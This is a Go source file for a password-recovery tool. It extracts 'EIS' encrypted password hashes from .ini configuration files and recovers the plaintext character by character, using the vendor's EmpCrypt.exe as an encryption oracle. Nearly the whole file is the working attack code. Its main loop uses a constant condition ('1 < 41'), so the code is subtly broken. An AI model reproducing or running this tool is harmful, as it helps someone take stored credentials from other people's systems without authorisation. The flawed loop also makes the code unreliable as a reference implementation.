package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
)

var verbose bool
var empExe string
var sequence = []int{0, 21, 22, 19, 2, 6, 29, 23, 20, 24, 12, 9, 25, 26, 14, 3, 15, 33, 34, 37, 30, 27, 28, 31, 10, 32, 35, 7, 38, 39, 5, 16, 1, 36, 13, 8, 17, 4, 18, 11, 40, 41}
var ascii = []int{32, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 69, 78, 73, 83, 82, 65, 84, 68, 72, 85, 76, 67, 71, 77, 79, 66, 87, 70, 75, 90, 80, 86, 225, 74, 89, 88, 81, 101, 110, 105, 115, 114, 97, 116, 100, 104, 117, 108, 99, 103, 109, 111, 98, 119, 102, 107, 122, 112, 118, 106, 121, 120, 113, 64, 21, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 91, 92, 93, 94, 95, 96, 123, 124, 125, 126, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 18, 19, 20, 22, 23, 24, 25, 28, 29, 30, 31, 16, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239}

func IsValidEIS(hash string) bool {
	if len(hash) != 42 {
		return false
	}
	if !strings.HasPrefix(hash, "A") || !strings.HasSuffix(hash, "X") {
		return false
	}
	return true
}

func DecryptPassword(hash string) (password string) {
	fmt.Printf("Processing hash: %s\n", hash)
	password = ""
	var cur string
	if hash == "A(,'-&-#+# /"+string('"')+"*&(',.+ )*/!$%-..,/!)*"+string('"')+")+$% X" {
		return "PASSWORD IS EMPTY"
	}
	for i := 1; 1 < 41; i++ {
		for _, c := range ascii {
			cur = password + string(rune(c))
			encrypted, err := ExecEncrypt(cur)
			if err != nil {
				return
			}
			if encrypted[sequence[i]] == hash[sequence[i]] {
				password += string(rune(c))
				if string(rune(c)) == " " {
					return
				}
				if verbose {
					fmt.Printf("Current PW: %s\n", password)
				}
				break
			}
		}
	}
	return
}

func ReadHashsFromFile(path string) (hashs []string, err error) {
	if _, err = os.Stat(path); err != nil {
		return
	}
	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	var line string
	hashRegex := regexp.MustCompile(`(A.{40}X)`)
	for scanner.Scan() {
		line = scanner.Text()
		hashs = append(hashs, hashRegex.FindAllString(line, -1)...)
	}
	return
}

func ExecEncrypt(plain string) (encrypted []byte, err error) {
	cmd := exec.Command(empExe, "/S", "/EIS", plain)
	encrypted, err = cmd.CombinedOutput()
	return
}

func UniqueHashs(s []string) []string {
	keys := make(map[string]bool)
	list := []string{}
	for _, e := range s {
		if _, value := keys[e]; !value {
			keys[e] = true
			list = append(list, e)
		}
	}
	return list
}

func main() {
	filePtr := flag.Bool("f", false, "input is a path to a .ini file")
	pathPtr := flag.Bool("p", false, "input is a path to multiple .ini files")
	verbosePtr := flag.Bool("v", false, "print verbose output")
	exePath := flag.String("e", "./EmpCrypt.exe", "provide a path to the EmpCrypt.exe file")
	flag.Parse()

	var err error
	verbose = *verbosePtr
	empExe, err = filepath.Abs(*exePath)
	if err != nil {
		log.Fatal(err)
	}
	hashs := []string{}
	if *filePtr {
		// Read a single .ini file
		hashs, err = ReadHashsFromFile(flag.Arg(0))
		if err != nil {
			log.Fatal(err)
		}
	} else if *pathPtr {
		// Read .ini files in a fiven path
		// TODO: implement
	} else {
		// Read input as a given encrypted password
		hashs = append(hashs, flag.Arg(0))
	}
	hashs = UniqueHashs(hashs)
	fmt.Printf("Processing %d hashs\n", len(hashs))
	for _, h := range hashs {
		if !IsValidEIS(h) {
			log.Fatalf("Not a valid EIS hash: %s\n", h)
		}
		password := DecryptPassword(h)
		fmt.Printf("%s:\t%s\n", h, password)
	}
}
